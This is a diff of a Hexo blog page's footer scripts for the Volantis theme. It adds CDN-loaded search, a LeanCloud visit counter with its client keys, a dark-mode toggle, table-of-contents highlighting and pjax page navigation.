-  let LAZY_LOAD_IMAGE = "";
-  $(".article-entry").find("div.fancybox").find("img").each(function () {
-      var element = document.createElement("a");
-      $(element).attr("data-fancybox", "gallery");
-      $(element).attr("href", $(this).attr("src"));
-      /* 图片采用懒加载处理时,
-       * 一般图片标签内会有个属性名来存放图片的真实地址，比如 data-original,
-       * 那么此处将原本的属性名src替换为对应属性名data-original,
-       * 修改如下
-       */
-       if (LAZY_LOAD_IMAGE) {
-         $(element).attr("href", $(this).attr("data-original"));
-       }
-      $(this).wrap(element);
+
+  
+<script src="/js/app.js"></script>
+
+
+
+<!-- optional -->
+
+  <script>
+const SearchServiceimagePath="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@master/img/";
+const ROOT =  ("/" || "/").endsWith('/') ? ("/" || "/") : ("//" || "/" );
+
+$('.input.u-search-input').one('focus',function(){
+	
+		loadScript('https://cdn.jsdelivr.net/gh/xaoxuu/cdn-volantis@2.6.5/js/search.js',setSearchService);
+	
+})
+
+function listenSearch(){
+  
+    customSearch = new HexoSearch({
+      imagePath: SearchServiceimagePath
+    });
+  
+}
+function setSearchService() {
+	listenSearch();
+	
+}
+</script>
+
+
+
+
+
+
+
+
+
+
+
+  <script defer>
+
+  const LCCounter = {
+    app_id: 'pHdKUGJwAoGnVczqB6eSKVzO-gzGzoHsz',
+    app_key: '9HlyBGu0qm9EmkSNKD2qoBx4',
+    custom_api_server: '',
+
+    // 查询存储的记录
+    getRecord(Counter, url, title) {
+      return new Promise(function (resolve, reject) {
+        Counter('get', '/classes/Counter?where=' + encodeURIComponent(JSON.stringify({url})))
+          .then(resp => resp.json())
+          .then(({results, code, error}) => {
+            if (code === 401) {
+              throw error;
+            }
+            if (results && results.length > 0) {
+              var record = results[0];
+              resolve(record);
+            } else {
+              Counter('post', '/classes/Counter', {url, title: title, times: 0})
+                .then(resp => resp.json())
+                .then((record, error) => {
+                  if (error) {
+                    throw error;
+                  }
+                  resolve(record);
+                }).catch(error => {
+                console.error('Failed to create', error);
+                reject(error);
+              });
+            }
+          }).catch((error) => {
+          console.error('LeanCloud Counter Error:', error);
+          reject(error);
+        });
+      })
+    },
+
+    // 发起自增请求
+    increment(Counter, incrArr) {
+      return new Promise(function (resolve, reject) {
+        Counter('post', '/batch', {
+          "requests": incrArr
+        }).then((res) => {
+          res = res.json();
+          if (res.error) {
+            throw res.error;
+          }
+          resolve(res);
+        }).catch((error) => {
+          console.error('Failed to save visitor count', error);
+          reject(error);
+        });
+      });
+    },
+
+    // 构建自增请求体
+    buildIncrement(objectId) {
+      return {
+        "method": "PUT",
+        "path": `/1.1/classes/Counter/${ objectId }`,
+        "body": {
+          "times": {
+            '__op': 'Increment',
+            'amount': 1
+          }
+        }
+      }
+    },
+
+    // 校验是否为有效的 UV
+    validUV() {
+      var key = 'LeanCloudUVTimestamp';
+      var flag = localStorage.getItem(key);
+      if (flag) {
+        // 距离标记小于 24 小时则不计为 UV
+        if (new Date().getTime() - parseInt(flag) <= 86400000) {
+          return false;
+        }
+      }
+      localStorage.setItem(key, new Date().getTime().toString());
+      return true;
+    },
+
+    addCount(Counter) {
+      var enableIncr = '' === 'true' && window.location.hostname !== 'localhost';
+      enableIncr = true;
+      var getterArr = [];
+      var incrArr = [];
+      // 请求 PV 并自增
+      var pvCtn = document.querySelector('#lc-sv');
+      if (pvCtn || enableIncr) {
+        var pvGetter = this.getRecord(Counter, 'https://www.bycsec.top' + '/#lc-sv', 'Visits').then((record) => {
+          incrArr.push(this.buildIncrement(record.objectId))
+          var eles = document.querySelectorAll('#lc-sv #number');
+          if (eles.length > 0) {
+            eles.forEach((el,index,array)=>{
+              el.innerText = record.times + 1;
+              if (pvCtn) {
+                pvCtn.style.display = 'inline';
+              }
+            })
+          }
+        });
+        getterArr.push(pvGetter);
+      }
+
+      // 请求 UV 并自增
+      var uvCtn = document.querySelector('#lc-uv');
+      if (uvCtn || enableIncr) {
+        var uvGetter = this.getRecord(Counter, 'https://www.bycsec.top' + '/#lc-uv', 'Visitors').then((record) => {
+          var vuv = this.validUV();
+          vuv && incrArr.push(this.buildIncrement(record.objectId))
+          var eles = document.querySelectorAll('#lc-uv #number');
+          if (eles.length > 0) {
+            eles.forEach((el,index,array)=>{
+              el.innerText = record.times + (vuv ? 1 : 0);
+              if (uvCtn) {
+                uvCtn.style.display = 'inline';
+              }
+            })
+          }
+        });
+        getterArr.push(uvGetter);
+      }
+
+      // 请求文章的浏览数，如果是当前页面就自增
+      var allPV = document.querySelectorAll('#lc-pv');
+      if (allPV.length > 0 || enableIncr) {
+        for (i = 0; i < allPV.length; i++) {
+          let pv = allPV[i];
+          let title = pv.getAttribute('data-title');
+          var url = 'https://www.bycsec.top' + pv.getAttribute('data-path');
+          if (url) {
+            var viewGetter = this.getRecord(Counter, url, title).then((record) => {
+              // 是当前页面就自增
+              let curPath = window.location.pathname;
+              if (curPath.includes('index.html')) {
+                curPath = curPath.substring(0, curPath.lastIndexOf('index.html'));
+              }
+              if (pv.getAttribute('data-path') == curPath) {
+                incrArr.push(this.buildIncrement(record.objectId));
+              }
+              if (pv) {
+                var ele = pv.querySelector('#lc-pv #number');
+                if (ele) {
+                  if (pv.getAttribute('data-path') == curPath) {
+                    ele.innerText = (record.times || 0) + 1;
+                  } else {
+                    ele.innerText = record.times || 0;
+                  }
+                  pv.style.display = 'inline';
+                }
+              }
+            });
+            getterArr.push(viewGetter);
+          }
+        }
+      }
+
+      // 如果启动计数自增，批量发起自增请求
+      if (enableIncr) {
+        Promise.all(getterArr).then(() => {
+          incrArr.length > 0 && this.increment(Counter, incrArr);
+        })
+      }
+
+    },
+
+
+    fetchData(api_server) {
+      var Counter = (method, url, data) => {
+        return fetch(`${ api_server }/1.1${ url }`, {
+          method,
+          headers: {
+            'X-LC-Id': this.app_id,
+            'X-LC-Key': this.app_key,
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(data)
+        });
+      };
+      this.addCount(Counter);
+    },
+
+    refreshCounter() {
+      var api_server = this.app_id.slice(-9) !== '-MdYXbMMI' ? this.custom_api_server : `https://${ this.app_id.slice(0, 8).toLowerCase() }.api.lncldglobal.com`;
+      if (api_server) {
+        this.fetchData(api_server);
+      } else {
+        fetch('https://app-router.leancloud.cn/2/route?appId=' + this.app_id)
+          .then(resp => resp.json())
+          .then(({api_server}) => {
+            this.fetchData('https://' + api_server);
+          });
+      }
+    }
+
+  };
+
+  LCCounter.refreshCounter();
+
+  document.addEventListener('pjax:complete', function () {
+    LCCounter.refreshCounter();
   });
 </script>
 
 
 
 
+  <script>
+const rootElement = document.documentElement;
+const darkModeStorageKey = "user-color-scheme";
+const rootElementDarkModeAttributeName = "data-user-color-scheme";
+
+const setLS = (k, v) => {
+    localStorage.setItem(k, v);
+};
+
+const removeLS = (k) => {
+    localStorage.removeItem(k);
+};
+
+const getLS = (k) => {
+    return localStorage.getItem(k);
+};
+
+const getModeFromCSSMediaQuery = () => {
+  return window.matchMedia("(prefers-color-scheme: dark)").matches
+    ? "dark"
+    : "light";
+};
+
+const resetRootDarkModeAttributeAndLS = () => {
+  rootElement.removeAttribute(rootElementDarkModeAttributeName);
+  removeLS(darkModeStorageKey);
+};
+
+const validColorModeKeys = {
+  dark: true,
+  light: true,
+};
+
+const applyCustomDarkModeSettings = (mode) => {
+  const currentSetting = mode || getLS(darkModeStorageKey);
+
+  if (currentSetting === getModeFromCSSMediaQuery()) {
+    resetRootDarkModeAttributeAndLS();
+  } else if (validColorModeKeys[currentSetting]) {
+    rootElement.setAttribute(rootElementDarkModeAttributeName, currentSetting);
+  } else {
+    resetRootDarkModeAttributeAndLS();
+  }
+};
+
+const invertDarkModeObj = {
+  dark: "light",
+  light: "dark",
+};
+
+/**
+ * get target mode
+ */
+const toggleCustomDarkMode = () => {
+  let currentSetting = getLS(darkModeStorageKey);
+
+  if (validColorModeKeys[currentSetting]) {
+    currentSetting = invertDarkModeObj[currentSetting];
+  } else if (currentSetting === null) {
+    currentSetting = invertDarkModeObj[getModeFromCSSMediaQuery()];
+  } else {
+    return;
+  }
+  setLS(darkModeStorageKey, currentSetting);
+  return currentSetting;
+};
+
+/**
+ * bind click event for toggle button
+ */
+var btn=$("#wrapper .toggle-mode-btn,#rightmenu-wrapper .toggle-mode-btn");
+function bindToggleButton() {
+    btn.on('click',(e) => {
+      const mode = toggleCustomDarkMode();
+      applyCustomDarkModeSettings(mode);
+    });
+}
+
+applyCustomDarkModeSettings();
+document.addEventListener("DOMContentLoaded", bindToggleButton);
+volantis.pjax.push(bindToggleButton);
+volantis.pjax.send(()=>{
+	btn.unbind('click');
+},'toggle-mode-btn-unbind');
+</script>
 
 
-  <script>setLoadingBarProgress(100);</script>
-</body>
+
+
+
+
+
+
+<script>
+function listennSidebarTOC() {
+  const navItems = document.querySelectorAll(".toc li");
+  if (!navItems.length) return;
+  const sections = [...navItems].map((element) => {
+    const link = element.querySelector(".toc-link");
+    const target = document.getElementById(
+      decodeURI(link.getAttribute("href")).replace("#", "")
+    );
+    link.addEventListener("click", (event) => {
+      event.preventDefault();
+      window.scrollTo({
+		top: target.offsetTop + 100,
+		
+		behavior: "smooth"
+		
+	  });
+    });
+    return target;
+  });
+
+  function activateNavByIndex(target) {
+    if (target.classList.contains("active-current")) return;
+
+    document.querySelectorAll(".toc .active").forEach((element) => {
+      element.classList.remove("active", "active-current");
+    });
+    target.classList.add("active", "active-current");
+    let parent = target.parentNode;
+    while (!parent.matches(".toc")) {
+      if (parent.matches("li")) parent.classList.add("active");
+      parent = parent.parentNode;
+    }
+  }
+
+  function findIndex(entries) {
+    let index = 0;
+    let entry = entries[index];
+    if (entry.boundingClientRect.top > 0) {
+      index = sections.indexOf(entry.target);
+      return index === 0 ? 0 : index - 1;
+    }
+    for (; index < entries.length; index++) {
+      if (entries[index].boundingClientRect.top <= 0) {
+        entry = entries[index];
+      } else {
+        return sections.indexOf(entry.target);
+      }
+    }
+    return sections.indexOf(entry.target);
+  }
+
+  function createIntersectionObserver(marginTop) {
+    marginTop = Math.floor(marginTop + 10000);
+    let intersectionObserver = new IntersectionObserver(
+      (entries, observe) => {
+        let scrollHeight = document.documentElement.scrollHeight + 100;
+        if (scrollHeight > marginTop) {
+          observe.disconnect();
+          createIntersectionObserver(scrollHeight);
+          return;
+        }
+        let index = findIndex(entries);
+        activateNavByIndex(navItems[index]);
+      },
+      {
+        rootMargin: marginTop + "px 0px -100% 0px",
+        threshold: 0,
+      }
+    );
+    sections.forEach((element) => {
+      element && intersectionObserver.observe(element);
+    });
+  }
+  createIntersectionObserver(document.documentElement.scrollHeight);
+}
+
+document.addEventListener("DOMContentLoaded", listennSidebarTOC);
+document.addEventListener("pjax:success", listennSidebarTOC);
+</script>
+
+<!-- more -->
+
+ 
+	   
+	    
+
+
+<script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js"></script>
+
+
+<script>
+    var pjax;
+    document.addEventListener('DOMContentLoaded', function () {
+      pjax = new Pjax({
+        elements: 'a[href]:not([href^="#"]):not([href="javascript:void(0)"]):not([pjax-fancybox])',
+        selectors: [
+          "title",
+          
+          "#pjax-container",
+          "#pjax-header-nav-list"
+        ],
+        cacheBust: false,   // url 地址追加时间戳，用以避免浏览器缓存
+        timeout: 5000
+      });
+    });
+
+    document.addEventListener('pjax:send', function (e) {
+      //window.stop(); // 相当于点击了浏览器的停止按钮
+
+      try {
+        var currentUrl = window.location.pathname;
+        var targetUrl = e.triggerElement.href;
+        var banUrl = [""];
+        if (banUrl[0] != "") {
+          banUrl.forEach(item => {
+            if(currentUrl.indexOf(item) != -1 || targetUrl.indexOf(item) != -1) {
+              window.location.href = targetUrl;
+            }
+          });
+        }
+      } catch (error) {}
+
+      window.subData = null; // 移除标题（用于一二级导航栏切换处）
+
+      volantis.$switcher.removeClass('active'); // 关闭移动端激活的搜索框
+      volantis.$header.removeClass('z_search-open'); // 关闭移动端激活的搜索框
+      volantis.$wrapper.removeClass('sub'); // 跳转页面时关闭二级导航
+
+      // 解绑事件 避免重复监听
+      volantis.$topBtn.unbind('click');
+      $('.menu a').unbind('click');
+      $(window).unbind('resize');
+      $(window).unbind('scroll');
+      $(document).unbind('scroll');
+      $(document).unbind('click');
+      $('body').unbind('click');
+	  // 使用 volantis.pjax.send 方法传入pjax:send回调函数 参见layout/_partial/scripts/global.ejs
+	  volantis.pjax.method.send.start();
+    });
+
+    document.addEventListener('pjax:complete', function () {
+      $('.nav-main').find('.list-v').not('.menu-phone').removeAttr("style",""); // 移除小尾巴的移除
+      $('.menu-phone.list-v').removeAttr("style",""); // 移除小尾巴的移除
+      $('script[data-pjax], .pjax-reload script').each(function () {
+        $(this).parent().append($(this).remove());
+      });
+      try{
+		// 使用 volantis.pjax.push 方法传入重载函数 参见layout/_partial/scripts/global.ejs
+		volantis.pjax.method.complete.start();
+      } catch (e) {
+        console.log(e);
+      }
+    });
+
+    document.addEventListener('pjax:error', function (e) {
+	  // 使用 volantis.pjax.error 方法传入pjax:error回调函数 参见layout/_partial/scripts/global.ejs
+	  volantis.pjax.method.error.start();
+      window.location.href = e.triggerElement.href;
+    });
+</script>
+ 
+	  
+    </div>
+  </body>
 </html>
